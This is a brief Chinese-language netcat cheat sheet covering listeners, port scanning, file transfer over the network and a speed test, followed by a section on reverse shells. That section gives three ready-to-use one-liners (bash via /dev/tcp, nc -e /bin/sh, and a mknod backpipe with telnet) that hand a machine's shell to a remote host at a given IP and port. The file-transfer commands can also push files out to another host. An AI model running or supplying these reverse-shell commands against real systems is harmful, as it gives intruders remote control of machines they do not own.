```
nc -lvnp 4444 
nc -vw 2 10.1.50.251 4444   1-1000
然后输入会在两边显示

单文件传输
nc -l 9995 >1.txt
nc 10.1.50.251 9995 < 2.txt

多文件传输
nc -l 9995 | tar xfvz -
tar cfz - * | nc 10.1.50.251 9995

网速测试
nc -l 9991 >/dev/null
nc 10.1.50.251 9991 </dev/zero

反弹shell
cat</dev/tcp/127.0.0.1/22

251上执行nc -lvnp 8080

250上执行以下任一命令，即可让251 连上250的bash
bash -i >& /dev/tcp/10.1.50.251/8080 0>&1
nc -e /bin/sh 10.1.50.251 8080
mknod backpipe p && telnet 10.1.50.251 8080 0<backpipe | /bin/bash 1>backpipe
```
